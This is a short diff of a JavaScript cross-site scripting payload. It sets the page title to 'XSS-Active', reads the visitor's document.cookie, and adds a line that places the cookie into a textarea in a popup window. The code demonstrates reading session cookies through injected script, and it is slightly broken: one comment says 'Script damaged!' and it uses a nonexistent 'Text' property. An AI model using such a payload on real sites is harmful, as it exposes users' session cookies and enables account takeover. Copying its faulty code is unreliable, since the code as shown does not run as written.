@@ -1,5 +1,3 @@
- 
-//BEGIN - Update Title for confirmation script loaded
 document.title = "XSS-Active"
 //Put Back the variable used to invoke the XSS
 //Script damaged!
@@ -17,6 +15,7 @@ var UsersCookie = document.cookie;
 function createPopup(){
 var popup = open("", "Popup", "width=300,height=200");
 var txtOk = popup.document.createElement("TEXTAREA");
+txtOk.Text = UsersCookie;
 var aOk = popup.document.createElement("a");
 aOk.innerHTML = "Click here";
 
